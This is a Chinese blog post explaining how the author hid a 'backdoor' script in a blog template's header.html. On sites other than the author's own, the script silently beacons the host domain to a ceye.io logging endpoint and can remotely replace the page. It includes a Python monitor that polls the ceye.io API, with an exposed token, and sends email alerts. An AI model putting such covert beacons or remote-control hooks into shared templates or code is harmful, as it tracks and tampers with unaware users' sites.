---
layout: post
author: Vulkey_Chen
title: "博客模板后门"
date: 2019-01-23
music-id: 
permalink: /archives/2019-01-23/1
description: "博客模板后门"
---

## 在博客模板的header.html中引用了外部的JS地址
<script src="aliyuncs.com/demo.min.js"></script><!--  https://X.com/arouline/demo.min.js -->
完整代码如下：

```javascript
var host = document.location.host;
var reg = new RegExp(/disbb.com/);
var isok = reg.test(host);
if(!isok){
	var img = document.createElement("img");
    img.src="http://myblog.d5z0tw.ceye.io/fuck?domain=" + host;
	img.style="display:none";
	document.body.appendChild(img);
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange=function(){
        if(xhr.responseText == "YES"){
        	document.write("<center><h1>Please tell me before using my template!By:[X.com]<center><h1>");
        }
    }
    xhr.open("GET","https://X.com/arouline/isopen.txt",true);
    xhr.send(null);
}
```

### Python 监控

利用`ceye.io`这个平台的API去实时监控，并且使用邮件发信通知。

导入Python模块 && 全局变量：

```python
#encoding: utf-8
import smtplib,requests,json,urlparse,sys,time
from email.MIMEText import MIMEText
from email.Utils import formatdate
from email.Header import Header

log = {}
```

**1.QQ邮件发信：**

```python
def send_mail(domain,ip):
	smtpHost = 'smtp.qq.com'
	smtpPort = '25'
	fromMail = 'X@qq.com'
	toMail = '接收方@qq.com'
	username = 'X@qq.com'
	password = 'X'
	reload(sys)
	sys.setdefaultencoding('utf8')
	subject = u'监控到有人copy您的disbb.com！'
	body = u"[信息]\n Domin: {0}  IP: {1}".format(domain,ip)

	encoding = 'utf-8'
	mail = MIMEText(body.encode(encoding),'plain',encoding)
	mail['Subject'] = Header(subject,encoding)
	mail['From'] = fromMail
	mail['To'] = toMail
	mail['Date'] = formatdate()

	try:
		smtp = smtplib.SMTP(smtpHost,smtpPort)
		smtp.ehlo()
		smtp.login(username,password)
		smtp.sendmail(fromMail,toMail.split(','),mail.as_string())
		print u"邮件已发送，监控信息："
		print body
	except Exception,e:
		print e
		print u"发送失败，监控信息："
		print body
	finally:
		smtp.close()
```

**2.ceye.io API调用获取信息，[个人中心](http://ceye.io/profile)可以看见API TOKEN，[API使用方法](http://ceye.io/api)：**

```python
def dnslog_monitor():
	api = "http://api.ceye.io/v1/records?token=613670c89aefe3488f89cb958d4b0370&type=http&filter=myblog"
	r = requests.get(api)
	json_data = json.loads(r.text)
	print json_data
	for i in json_data['data']:
		query = urlparse.urlparse(i['name']).query
		sb_domain = dict([(k, v[0]) for k, v in urlparse.parse_qs(query).items()])['domain']
		sb_ip = i['remote_addr']
		if sb_domain in log:
			pass
		else:
			print sb_domain
			log[sb_domain] = sb_ip
			send_mail(sb_domain,sb_ip)
```

**3.main函数：**

```python
def main():
	while True:
		dnslog_monitor()
		time.sleep(3)

if __name__ == '__main__':
     main()
```
